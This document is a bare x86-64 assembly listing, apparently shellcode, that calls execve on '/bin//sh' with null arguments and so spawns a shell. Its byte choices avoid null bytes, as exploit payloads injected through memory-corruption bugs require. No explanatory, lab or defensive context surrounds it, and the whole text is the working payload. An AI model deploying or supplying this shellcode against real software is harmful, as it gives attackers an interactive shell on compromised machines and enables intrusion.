start:
  push byte 0x3b;
  pop rax;
  cdq;
  push rdx;
  pop rsi;
  push rdx;
  mov rcx ,0x68732f2f6e69622f;
  push rcx;
  push rsp;
  pop rdi;
  syscall;
